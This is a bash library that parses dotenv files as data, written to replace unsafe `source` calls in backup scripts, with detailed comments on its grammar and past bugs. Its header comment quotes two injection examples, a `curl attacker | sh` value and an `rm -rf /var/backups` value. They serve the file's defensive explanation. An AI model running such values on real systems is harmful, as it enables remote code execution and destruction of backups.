# shellcheck shell=bash
#
# Read a dotenv file as DATA. Never as shell.
#
# F-A8M-2. Four release scripts loaded their environment with
#
#     set -a; source "$ENV_FILE"; set +a
#
# and `.env.staging` carried
#
#     DATABASE_URL=mongodb://...?replicaSet=rsstg&authSource=admin&retryWrites=true
#
# unquoted. `source` executes the file, so the shell read the `&` as a control
# operator, backgrounded the assignment, and the variable never reached the
# script: `production_backup.sh` died on `MONGO_URI or DATABASE_URL is
# required`, and staging took no backup. Production's `.env` happens to quote
# the same value, which is the only reason production backups work — nothing in
# the tree required it.
#
# Truncation is the mild failure. The severe one is that `source` on an
# environment file is arbitrary code execution as whoever runs the backup, which
# on this deployment is root: a value of `$(curl attacker | sh)` runs, and a
# value of `; rm -rf /var/backups` runs. An environment file is data that
# arrives from operators, from `scp`, from a template — it is not a program, and
# nothing in these scripts ever wanted it to be one.
#
# This parser assigns with `export "$key=$value"`, where `$value` is a variable
# the shell does not re-scan. No `eval`, no `source`, no command substitution,
# no interpolation.
#
# GRAMMAR — Docker Compose's, because compose is the other consumer of these
# same files and the two must not disagree about what a line means:
#
#   * blank lines, and lines whose first non-blank character is `#`, are skipped
#   * an optional `export ` prefix is accepted and ignored
#   * `KEY=VALUE`, where KEY matches `[A-Za-z_][A-Za-z0-9_]*`
#   * a single-quoted value is literal to the closing quote — no escapes
#   * a double-quoted value honours `\\`, `\"`, `\n`, `\r`, `\t`
#   * an unquoted value runs to end of line, except that ` #` (whitespace then
#     hash) begins a comment; `&`, `$`, `;`, backticks, quotes and `=` inside it
#     are ordinary characters
#   * a quoted value may span lines
#
# Deliberately NOT supported: `${VAR}` interpolation. Compose performs it for
# its own rendering, and no value in this tree uses it; doing it here would
# reintroduce exactly the class of surprise this file exists to remove, and a
# reader could no longer tell what a line means without knowing the environment
# it was read in.
#
# A malformed line is a hard error naming the file and line NUMBER. No value is
# ever printed — the whole point of this file is that its contents are secrets.

#: Assign one already-parsed pair. Split out so the assignment path is one line
#: that can be read and reasoned about on its own.
_env_file_assign() {
  local key=$1 value=$2
  # `export "NAME=value"` builds the word from variables; bash does not re-scan
  # the result, so shell metacharacters in `value` are data.
  export "${key}=${value}"
}

#: Decode the escapes a double-quoted value may carry. Character by character,
#: because `echo -e` and `printf %b` would also decode sequences the grammar
#: does not define, and `eval`-based unquoting is the defect itself.
_env_file_unescape() {
  local input=$1 output="" index=0 char next
  while ((index < ${#input})); do
    char=${input:index:1}
    if [[ "$char" == "\\" && $((index + 1)) -lt ${#input} ]]; then
      next=${input:index+1:1}
      # The backslash arm is written `\\)` and NOT `'\\')`. Quoting a case
      # pattern removes its special meaning, so `'\\')` matches the literal
      # two-character string `\\` - which a single character never is, so the
      # arm was dead and `\\` fell through undecoded while the character after
      # it was re-read as an escape. Measured: `"a\\b"` came back as `a\\b`.
      case "$next" in
        n) output+=$'\n'; index=$((index + 2)); continue ;;
        r) output+=$'\r'; index=$((index + 2)); continue ;;
        t) output+=$'\t'; index=$((index + 2)); continue ;;
        \\) output+="\\"; index=$((index + 2)); continue ;;
        '"') output+='"'; index=$((index + 2)); continue ;;
      esac
    fi
    output+=$char
    index=$((index + 1))
  done
  printf '%s' "$output"
}

#: Find the closing quote of `$2` in `$1`, starting at index `$3`, honouring
#: backslash escapes when the quote is a double quote. Prints the index, or -1.
_env_file_closing_quote() {
  local text=$1 quote=$2 index=$3 char
  while ((index < ${#text})); do
    char=${text:index:1}
    if [[ "$quote" == '"' && "$char" == "\\" ]]; then
      index=$((index + 2))
      continue
    fi
    if [[ "$char" == "$quote" ]]; then
      printf '%s' "$index"
      return 0
    fi
    index=$((index + 1))
  done
  printf '%s' "-1"
}

# env_file_load <path>
#
# Export every assignment in <path>. A missing file is not an error - the
# callers all treat the env file as optional - but a malformed one is.
env_file_load() {
  local file=$1
  [[ -f "$file" ]] || return 0

  local line raw key value quote close rest lineno=0 open_lineno

  while IFS= read -r line || [[ -n "$line" ]]; do
    lineno=$((lineno + 1))
    line=${line%$'\r'}
    raw=${line#"${line%%[![:space:]]*}"}   # strip leading whitespace

    [[ -z "$raw" || "${raw:0:1}" == "#" ]] && continue

    if [[ "$raw" == export[[:space:]]* ]]; then
      raw=${raw#export}
      raw=${raw#"${raw%%[![:space:]]*}"}
    fi

    if [[ ! "$raw" =~ ^([A-Za-z_][A-Za-z0-9_]*)=(.*)$ ]]; then
      echo "${file}:${lineno}: not a KEY=VALUE assignment" >&2
      return 1
    fi
    key=${BASH_REMATCH[1]}
    raw=${BASH_REMATCH[2]}

    quote=${raw:0:1}
    if [[ "$quote" == '"' || "$quote" == "'" ]]; then
      open_lineno=$lineno
      value=${raw:1}
      close=$(_env_file_closing_quote "$value" "$quote" 0)
      while [[ "$close" == "-1" ]]; do
        # A quoted value may span lines. Keep reading; running out of file with
        # the quote still open is an error, not a value.
        #
        # `|| [[ -n "$line" ]]` for the same reason the outer loop has it: a
        # final line with no trailing newline makes `read` return non-zero
        # while still having filled `line`. Without it, a file whose last
        # character is the closing quote was rejected as unterminated.
        if ! IFS= read -r line && [[ -z "$line" ]]; then
          echo "${file}:${open_lineno}: unterminated ${quote} quote" >&2
          return 1
        fi
        lineno=$((lineno + 1))
        value+=$'\n'${line%$'\r'}
        close=$(_env_file_closing_quote "$value" "$quote" 0)
      done
      rest=${value:close+1}
      value=${value:0:close}
      rest=${rest#"${rest%%[![:space:]]*}"}
      if [[ -n "$rest" && "${rest:0:1}" != "#" ]]; then
        echo "${file}:${lineno}: trailing characters after a quoted value" >&2
        return 1
      fi
      [[ "$quote" == '"' ]] && value=$(_env_file_unescape "$value")
    else
      # Unquoted. ` #` starts a comment; every other character - `&`, `$`, `;`,
      # a backtick, an embedded `=` - is part of the value.
      #
      # `%%` removes the LONGEST matching suffix, which is the shortest kept
      # prefix, so the cut lands on the FIRST ` #`. The ERE this replaces was
      # greedy in the other direction and cut on the last one: compose reads
      # `foo # one # two` as `foo`, and this file read it as `foo # one`. The
      # header promises the two do not disagree.
      value=${raw%%[[:space:]]#*}
      value=${value%"${value##*[![:space:]]}"}   # strip trailing whitespace
    fi

    _env_file_assign "$key" "$value"
  done <"$file"
}
